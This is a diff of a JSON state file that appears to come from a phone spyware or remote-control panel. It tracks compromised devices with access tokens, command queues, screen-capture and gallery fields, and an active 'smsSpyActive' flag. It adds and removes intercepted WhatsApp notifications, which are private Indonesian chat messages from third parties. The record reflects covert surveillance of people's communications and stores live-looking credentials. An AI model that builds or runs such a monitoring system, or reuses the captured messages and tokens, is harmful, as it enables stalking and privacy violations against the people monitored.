@@ -4,7 +4,7 @@
     "deviceName": "HP-AIM-7C2F",
     "ownerUsername": "51a6566b-13c6-424c-8f68-421c28fdc099",
     "token": "5c459e8712f2a7ee2b4192ea89156763",
-    "lastSeen": 1775042786211,
+    "lastSeen": 1775042792232,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-01T10:32:40.020Z",
@@ -20,6 +20,22 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "‎main botwiee bersama (12626 pesan): ~ Dapa",
+        "content": ".brat pap manis nya dong",
+        "time": "01/04 19:26",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775042792364
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎14887 pesan dari 9 chat",
+        "time": "01/04 19:26",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775042788983
+      },
       {
         "appName": "WhatsApp",
         "sender": "‎main botwiee bersama (12625 pesan): ~ 🕷️",
@@ -4003,22 +4019,6 @@
         "time": "01/04 19:17",
         "pkg": "com.whatsapp",
         "receivedAt": 1775042262646
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "WhatsApp",
-        "content": "‎‎14763 pesan dari 11 chat",
-        "time": "01/04 19:17",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775042262618
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "WhatsApp",
-        "content": "‎‎14762 pesan dari 11 chat",
-        "time": "01/04 19:17",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775042261383
       }
     ],
     "galleryPhotos": [],
@@ -4049,7 +4049,7 @@
     "deviceName": "HP-AIM-22BD",
     "ownerUsername": "51a6566b-13c6-424c-8f68-421c28fdc099",
     "token": "ee7716168abf03ae6470b12578967076",
-    "lastSeen": 1775042787244,
+    "lastSeen": 1775042791424,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-01T10:33:59.233Z",
